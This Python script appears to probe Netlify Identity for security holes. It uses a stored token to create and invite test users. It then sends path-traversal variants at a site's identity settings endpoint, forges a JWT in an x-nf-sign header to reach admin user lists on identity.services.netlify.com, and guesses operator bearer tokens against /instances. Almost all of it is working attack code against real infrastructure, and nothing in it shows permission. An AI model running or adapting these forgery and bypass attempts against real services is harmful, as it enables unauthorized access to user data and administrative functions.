# -*- coding: utf-8 -*-
# _idn_final_probe.py - final verification batch: invite semantics, settings bypass, x-nf-sign forgery
import json, base64, urllib.request, urllib.error
from _net_creds import TOKEN_A, SITE_A

INST = '6a97f260e3e0091b16d132ce'
EMAIL = 'zztest-idn-0942@qq.com'
NEW_EMAIL = 'zztest-idn-0999@qq.com'

def req(method, url, body=None, tok=None, hdrs_extra=None, ct='application/json'):
    hdrs = dict(hdrs_extra or {})
    if tok: hdrs['Authorization'] = 'Bearer ' + tok
    data = None
    if body is not None:
        hdrs['Content-Type'] = ct
        if isinstance(body, bytes):
            data = body
        else:
            data = json.dumps(body).encode() if isinstance(body, (dict, list)) else body.encode()
    r = urllib.request.Request(url, method=method, headers=hdrs, data=data)
    try:
        resp = urllib.request.urlopen(r, timeout=25)
        return resp.status, resp.headers.get('content-type',''), resp.read(2000).decode('utf-8','replace')
    except urllib.error.HTTPError as e:
        return e.code, e.headers.get('content-type',''), e.read(2000).decode('utf-8','replace')
    except Exception as e:
        return 'ERR', '', str(e)[:150]

base = 'https://api.netlify.com/api/v1/sites/%s/identity/%s' % (SITE_A, INST)
HOST = 'https://sec-test-rcf6lz.netlify.app/.netlify/identity'

print('=== 1. invite semantics: create user then invite, watch confirmation_sent_at ===')
st, ct, b = req('POST', base + '/users', {'email': NEW_EMAIL}, tok=TOKEN_A)
print('create ->', st, b[:200].replace('\n',' '))
uid = json.loads(b)['id'] if st in (200, 201) else None
if uid:
    st2, _, _ = req('POST', base + '/users/invite', {'email': NEW_EMAIL}, tok=TOKEN_A)
    print('invite ->', st2)
    st3, ct3, b3 = req('GET', base + '/users/%s' % uid, tok=TOKEN_A)
    print('user after invite:', b3[:400].replace('\n',' '))

print()
print('=== 2. settings endpoint bypass variants on site domain ===')
for p in ('/.netlify/identity/settings/', '/.netlify/identity/./settings', '/.netlify/identity/settings/..',
          '/.netlify/identity/settings%2f', '/.netlify//identity/settings', '/.netlify/identity/settings?x=1'):
    st, ct, b = req('GET', 'https://sec-test-rcf6lz.netlify.app' + p)
    print('%-48s -> %s %s %s' % (p, st, ct[:22], b[:100].replace('\n',' ')))

print()
print('=== 3. x-nf-sign forgery attempt on identity.services (confirm signature required) ===')
def b64u(s): return base64.urlsafe_b64encode(s).rstrip(b'=')
hdr_jwt = (b64u(json.dumps({'alg': 'HS256'}).encode()) + b'.' +
           b64u(json.dumps({'id': SITE_A, 'netlify_id': 'x', 'exp': 9999999999}).encode()) + b'.' + b64u(b'x')).decode()
for host in ('https://identity.services.netlify.com', 'https://sec-test-rcf6lz.netlify.app/.netlify'):
    st, ct, b = req('GET', host + '/admin/users', hdrs_extra={'x-nf-sign': hdr_jwt})
    print('%-42s -> %s %s' % (host, st, b[:150].replace('\n',' ')))
# also operator token guess on /instances
for tok in ('operator', 'netlify', 'super-secret-operator-token', 'foobar'):
    st, ct, b = req('GET', 'https://identity.services.netlify.com/instances', tok=tok)
    print('instances bearer=%-24s -> %s %s' % (tok, st, b[:120].replace('\n',' ')))
